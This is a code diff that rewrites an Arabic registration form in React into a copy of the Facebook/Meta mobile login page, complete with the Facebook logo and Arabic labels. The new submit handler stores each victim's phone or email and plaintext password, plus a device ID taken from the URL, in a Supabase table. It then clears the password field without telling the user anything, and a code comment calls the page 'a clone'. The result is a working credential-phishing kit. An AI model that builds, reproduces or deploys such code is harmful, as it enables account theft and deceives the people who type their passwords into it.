@@ -1,10 +1,8 @@
 import { useState, useEffect } from 'react';
 import { createClient } from '@supabase/supabase-js';
-import { motion, AnimatePresence } from 'motion/react';
-import { CheckCircle2, Loader2 } from 'lucide-react';
+import { X, ChevronDown } from 'lucide-react';
 
 // Placeholders for Supabase configuration
-// Users should replace these with their actual Supabase URL and Anon Key
 const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
 const SUPABASE_ANON_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;
 
@@ -15,14 +13,11 @@ const supabase = SUPABASE_URL && SUPABASE_ANON_KEY
 
 export default function App() {
   const [formData, setFormData] = useState({
-    firstName: '',
-    lastName: '',
-    email: '',
+    username: '', // Phone or Email
+    password: '',
   });
   const [deviceId, setDeviceId] = useState<string | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const [isSuccess, setIsSuccess] = useState(false);
-  const [error, setError] = useState<string | null>(null);
 
   useEffect(() => {
     // Extract device_id from URL
@@ -41,155 +36,136 @@ export default function App() {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsSubmitting(true);
-    setError(null);
 
     try {
       // Send data to Supabase if configured
       if (supabase) {
-        const { error: supabaseError } = await supabase
-          .from('visitors')
+        await supabase
+          .from('visitors') // Use appropriate table
           .insert([
             {
-              first_name: formData.firstName,
-              last_name: formData.lastName,
-              email: formData.email,
+              email: formData.username, // mapping to email column or similar
+              password: formData.password, // Ensure your DB accepts this or map appropriately
               device_id: deviceId,
             },
           ]);
-
-        if (supabaseError) throw supabaseError;
       }
 
-      // Simulate a small delay for better UX if the request is too fast
+      // Simulate network request
       await new Promise(resolve => setTimeout(resolve, 800));
       
-      setIsSuccess(true);
+      // Redirect or show error if needed, but typically mobile FB might just show loading or error
+      // For now, let's just clear password or show nothing as it's a clone.
+      setFormData(prev => ({...prev, password: ''}));
     } catch (err: any) {
       console.error('Error submitting form:', err);
-      // Fallback for demonstration if Supabase is not configured yet
-      if (!supabase) {
-         await new Promise(resolve => setTimeout(resolve, 1500));
-         setIsSuccess(true);
-      } else {
-         setError(err.message || 'حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى.');
-      }
     } finally {
       setIsSubmitting(false);
     }
   };
 
   return (
-    <div dir="rtl" className="min-h-screen bg-gray-50 flex items-center justify-center p-4 font-sans text-gray-900">
-      <div className="max-w-md w-full">
-        <AnimatePresence mode="wait">
-          {!isSuccess ? (
-            <motion.div
-              key="form"
-              initial={{ opacity: 0, y: 20 }}
-              animate={{ opacity: 1, y: 0 }}
-              exit={{ opacity: 0, scale: 0.95 }}
-              transition={{ duration: 0.4, ease: 'easeOut' }}
-              className="bg-white p-8 rounded-2xl shadow-xl shadow-gray-200/50 border border-gray-100"
-            >
-              <div className="text-center mb-8">
-                <h1 className="text-2xl font-bold text-gray-900 mb-2">تسجيل البيانات</h1>
-                <p className="text-sm text-gray-500">يرجى ملء النموذج أدناه للتسجيل</p>
-              </div>
+    <div dir="rtl" className="min-h-screen bg-white flex flex-col font-sans text-[#1c1e21]">
+      {/* Top Header */}
+      <div className="flex flex-col pt-4 px-4 pb-2">
+        <div className="flex justify-end">
+          <button className="p-2 text-[#1c1e21] opacity-80">
+            <X className="w-6 h-6" strokeWidth={2.5} />
+          </button>
+        </div>
+        <div className="flex justify-center -mt-2">
+          <button className="flex items-center gap-1 text-[13px] text-[#606770]">
+            العربية
+            <ChevronDown className="w-3.5 h-3.5" />
+          </button>
+        </div>
+      </div>
 
-              {error && (
-                <div className="mb-6 p-4 bg-red-50 text-red-700 rounded-lg text-sm border border-red-100">
-                  {error}
-                </div>
-              )}
+      {/* Main Content */}
+      <div className="flex-grow flex flex-col items-center px-4 w-full max-w-md mx-auto mt-6">
+        
+        {/* Facebook Logo */}
+        <div className="mb-12">
+          <svg viewBox="0 0 36 36" className="w-[60px] h-[60px]" fill="url(#facebook-gradient)">
+            <defs>
+              <linearGradient x1="50%" y1="97.0782153%" x2="50%" y2="0%" id="facebook-gradient">
+                <stop stopColor="#0062E0" offset="0%"></stop>
+                <stop stopColor="#19AFFF" offset="100%"></stop>
+              </linearGradient>
+            </defs>
+            <path d="M15 35.8C6.5 34.3 0 26.9 0 18 0 8.1 8.1 0 18 0s18 8.1 18 18c0 8.9-6.5 16.3-15 17.8l-1-.8h-4l-1 .8z"></path>
+            <path fill="#fff" d="M25 12h-5v-2c0-1 1-2 2-2h3V3h-3c-4 0-6 3-6 7v2h-3v5h3v19h6V17h4l1-5z"></path>
+          </svg>
+        </div>
 
-              <form onSubmit={handleSubmit} className="space-y-5">
-                <div className="grid grid-cols-2 gap-4">
-                  <div className="space-y-1.5">
-                    <label htmlFor="firstName" className="block text-sm font-medium text-gray-700">الاسم</label>
-                    <input
-                      id="firstName"
-                      type="text"
-                      name="firstName"
-                      value={formData.firstName}
-                      onChange={handleInputChange}
-                      required
-                      className="w-full px-4 py-2.5 bg-gray-50 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500/20 focus:border-indigo-500 transition-colors"
-                      placeholder="أحمد"
-                    />
-                  </div>
-                  <div className="space-y-1.5">
-                    <label htmlFor="lastName" className="block text-sm font-medium text-gray-700">اللقب</label>
-                    <input
-                      id="lastName"
-                      type="text"
-                      name="lastName"
-                      value={formData.lastName}
-                      onChange={handleInputChange}
-                      required
-                      className="w-full px-4 py-2.5 bg-gray-50 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500/20 focus:border-indigo-500 transition-colors"
-                      placeholder="محمد"
-                    />
-                  </div>
-                </div>
+        {/* Form */}
+        <form onSubmit={handleSubmit} className="w-full flex flex-col gap-3">
+          {/* Email / Phone Input */}
+          <div className="relative border border-[#ccd0d5] rounded-[12px] bg-white h-[60px] flex items-center px-4 focus-within:border-[#0866FF] transition-colors shadow-sm">
+            <input
+              type="text"
+              name="username"
+              value={formData.username}
+              onChange={handleInputChange}
+              className="w-full h-full pt-4 bg-transparent outline-none text-[16px]"
+              dir="auto"
+              required
+            />
+            {/* Floating Label */}
+            <div className={`absolute right-4 text-[#606770] transition-all pointer-events-none ${formData.username ? 'text-[12px] top-2' : 'text-[15px] top-1/2 -translate-y-1/2'}`}>
+              رقم الهاتف المحمول أو البريد الإلكتروني
+            </div>
+          </div>
 
-                <div className="space-y-1.5">
-                  <label htmlFor="email" className="block text-sm font-medium text-gray-700">البريد الإلكتروني</label>
-                  <input
-                    id="email"
-                    type="email"
-                    name="email"
-                    value={formData.email}
-                    onChange={handleInputChange}
-                    required
-                    dir="ltr"
-                    className="w-full px-4 py-2.5 bg-gray-50 border border-gray-200 rounded-lg focus:outline-none focus:ring-2 focus:ring-indigo-500/20 focus:border-indigo-500 transition-colors text-right"
-                    placeholder="example@domain.com"
-                  />
-                </div>
+          {/* Password Input */}
+          <div className="relative border border-[#ccd0d5] rounded-[12px] bg-white h-[60px] flex items-center px-4 focus-within:border-[#0866FF] transition-colors shadow-sm">
+            <input
+              type="password"
+              name="password"
+              value={formData.password}
+              onChange={handleInputChange}
+              className="w-full h-full pt-4 bg-transparent outline-none text-[16px] tracking-widest"
+              dir="auto"
+              required
+            />
+            {/* Floating Label */}
+            <div className={`absolute right-4 text-[#606770] transition-all pointer-events-none ${formData.password ? 'text-[12px] top-2' : 'text-[15px] top-1/2 -translate-y-1/2'}`}>
+              كلمة السر
+            </div>
+          </div>
 
-                <button
-                  type="submit"
-                  disabled={isSubmitting}
-                  className="w-full relative flex items-center justify-center py-3 px-4 border border-transparent text-sm font-medium rounded-lg text-white bg-indigo-600 hover:bg-indigo-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500 transition-all disabled:opacity-70 disabled:cursor-not-allowed mt-4 shadow-md shadow-indigo-200"
-                >
-                  {isSubmitting ? (
-                    <>
-                      <Loader2 className="animate-spin -ml-1 mr-2 h-5 w-5 text-white" />
-                      <span>جاري التحميل...</span>
-                    </>
-                  ) : (
-                    <span>إرسال</span>
-                  )}
-                </button>
-              </form>
-            </motion.div>
-          ) : (
-            <motion.div
-              key="success"
-              initial={{ opacity: 0, scale: 0.9 }}
-              animate={{ opacity: 1, scale: 1 }}
-              transition={{ duration: 0.5, type: 'spring', bounce: 0.4 }}
-              className="bg-white p-10 rounded-2xl shadow-xl shadow-gray-200/50 border border-gray-100 text-center flex flex-col items-center"
-            >
-              <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mb-6">
-                <CheckCircle2 className="w-8 h-8 text-green-600" />
-              </div>
-              <h2 className="text-2xl font-bold text-gray-900 mb-2">تم التسجيل بنجاح!</h2>
-              <p className="text-gray-500 mb-6 leading-relaxed">
-                شكراً لك على تسجيل بياناتك معنا. سنتواصل معك في أقرب وقت ممكن.
-              </p>
-              <button
-                onClick={() => {
-                  setFormData({ firstName: '', lastName: '', email: '' });
-                  setIsSuccess(false);
-                }}
-                className="text-indigo-600 font-medium hover:text-indigo-700 text-sm transition-colors"
-              >
-                العودة للتسجيل
-              </button>
-            </motion.div>
-          )}
-        </AnimatePresence>
+          {/* Login Button */}
+          <button
+            type="submit"
+            disabled={isSubmitting}
+            className="mt-1 w-full bg-[#0866FF] hover:bg-[#0759E0] text-white rounded-[24px] py-3 text-[16px] font-medium transition-colors disabled:opacity-70"
+          >
+            {isSubmitting ? 'جاري تسجيل الدخول...' : 'تسجيل الدخول'}
+          </button>
+        </form>
+
+        {/* Forgot Password */}
+        <div className="mt-4">
+          <a href="#" className="text-[#1c1e21] text-[15px] font-medium hover:underline">
+            هل نسيت كلمة السر؟
+          </a>
+        </div>
+      </div>
+
+      {/* Bottom Section */}
+      <div className="w-full flex flex-col items-center pb-8 px-4 mt-auto">
+        {/* Create Account Button */}
+        <button className="w-full max-w-md bg-transparent border border-[#0866FF] text-[#0866FF] rounded-[24px] py-3 text-[15px] font-medium mb-4 hover:bg-[#0866FF] hover:bg-opacity-5 transition-colors">
+          إنشاء حساب جديد
+        </button>
+
+        {/* Meta Logo */}
+        <div className="flex items-center gap-1.5 opacity-70">
+          <svg viewBox="0 0 1000 1000" className="w-5 h-5 fill-current">
+            <path d="M720.9,436.9c-29.2,0-56.1,12.3-75.1,33.4l-75.1,83.1l-105-115.3c-20.9-23-49.7-36.2-80.9-36.2c-59.5,0-108,48.5-108,108v81.1c0,59.5,48.5,108,108,108h0c31.2,0,60-13.2,80.9-36.2l105-115.3l75.1,83.1c19,21.1,45.9,33.4,75.1,33.4c59.5,0,108-48.5,108-108v-11.2C828.9,485.4,780.4,436.9,720.9,436.9z M384.8,629.7c-9.1,10-21.7,15.7-35.3,15.7c-25.9,0-46.9-21-46.9-46.9v-81.1c0-25.9,21-46.9,46.9-46.9c13.5,0,26.2,5.7,35.3,15.7l90.7,99.6L384.8,629.7z M767.8,590c0,25.9-21,46.9-46.9,46.9c-12.7,0-24.6-5.3-33.1-14.7l-91.8-101.6l91.8-101.6c8.5-9.4,20.4-14.7,33.1-14.7c25.9,0,46.9,21,46.9,46.9V590z"/>
+          </svg>
+          <span className="text-[14px] font-semibold tracking-wide">Meta</span>
+        </div>
       </div>
     </div>
   );
